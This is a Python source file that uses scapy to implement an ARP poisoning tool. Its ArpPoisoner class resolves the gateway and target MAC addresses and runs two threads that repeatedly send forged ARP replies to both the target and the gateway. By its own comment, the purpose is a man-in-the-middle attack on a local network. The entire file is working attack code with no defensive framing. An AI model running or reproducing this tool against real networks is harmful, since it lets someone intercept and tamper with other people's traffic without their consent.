import os
import sys
import time
import threading
from scapy.layers.l2 import ARP, Ether, srp1, srp
from scapy.sendrecv import send
from termcolor import colored


def get_gateway_ip():
    platform_id = sys.platform  # Determine the OS

    if platform_id == "win32":  # Windows
        return os.popen("ipconfig | findstr Default").read().split()[-1]
    else:  # Linux
        return os.popen("route -n | grep 'UG[ \t]' | awk '{print $2}'").read().strip()


def get_mac(ip):
    arp_request_pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    # send and await response
    answer = srp(arp_request_pkt, timeout=2, verbose=False)[0]
    mac = answer[0][1].hwsrc
    return mac


class ArpPoisoner:
    def __init__(self, target, gateway, interval, ignore_cache):
        if target is None:
            print("[ARP] Error: Unspecified target.")
            sys.exit(1)

        if gateway is None:
            self.gateway = get_gateway_ip()
        else:
            self.gateway = gateway

        self.target = target
        self.interval = interval
        self.ignore_cache = ignore_cache
        self.t1 = threading
        self.t2 = threading
        self.thread_lock_event = threading.Event()
        self.thread_lock_event.set()

    def get_target_mac(self):
        if not self.ignore_cache:
            # Check ARP cache for target MAC address
            cache = os.popen("arp -a {}".format(self.target)).read().split()
            if sys.platform == "win32":
                if len(cache) > 4:
                    return cache[-2].replace("-", ":")
            else:
                if len(cache) > 7:
                    return cache[3]

        # Create ARP request packet
        ether_broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request = ARP(pdst=self.target)
        broadcast_arp = ether_broadcast / arp_request

        # Send ARP request and listen for valid response
        while True:
            response = srp1(broadcast_arp, verbose=False)
            if response.psrc == self.target:
                return response.hwsrc
            else:
                time.sleep(5)

    def restore_arp_table(self):
        # getting the real MACs
        victim_mac = get_mac(self.target)
        gateway_mac = get_mac(self.gateway)
        # creating the packet
        packet = ARP(op=2, pdst=self.target, hwdst=victim_mac, psrc=self.gateway, hwsrc=gateway_mac)
        # sending the packet
        send(packet, verbose=False)

    def arp_poison(self, target_ip, gateway_ip):
        if target_ip == ARP().psrc:
            target_mac = ARP().hwsrc  # Return MAC address of machine
        else:
            target_mac = self.get_target_mac()  # Get MAC address of target

        # Construct ARP packet
        arp = ARP(psrc=gateway_ip, pdst=target_ip, hwdst=target_mac, op=2)  # is-at operation

        # Indefinitely send packets based on thread lock event
        while self.thread_lock_event.is_set():
            send(arp, verbose=0)
            print(colored("[ARP] Sent packet to {} / {} from {}".format(target_ip, target_mac, gateway_ip), "light_grey"))
            time.sleep(self.interval)
        print("Killing thread")

    def close_threads(self):
        print("attempting to close threads.")
        self.thread_lock_event.clear()
        self.t1.join()
        self.t2.join()
        print("threads successfully closed")

    def start(self):
        # Poison the target's and gateway's ARP cache to establish a MITM attack
        self.t1 = threading.Thread(target=lambda: self.arp_poison(self.target, self.gateway))
        self.t2 = threading.Thread(target=lambda: self.arp_poison(self.gateway, self.target))

        # Set as daemon threads to allow main thread to exit
        self.t1.daemon = True
        self.t2.daemon = True

        # Simultaneously run the threads
        self.t1.start()
        self.t2.start()

        print(colored("Started ARP poisoning.", "light_grey"))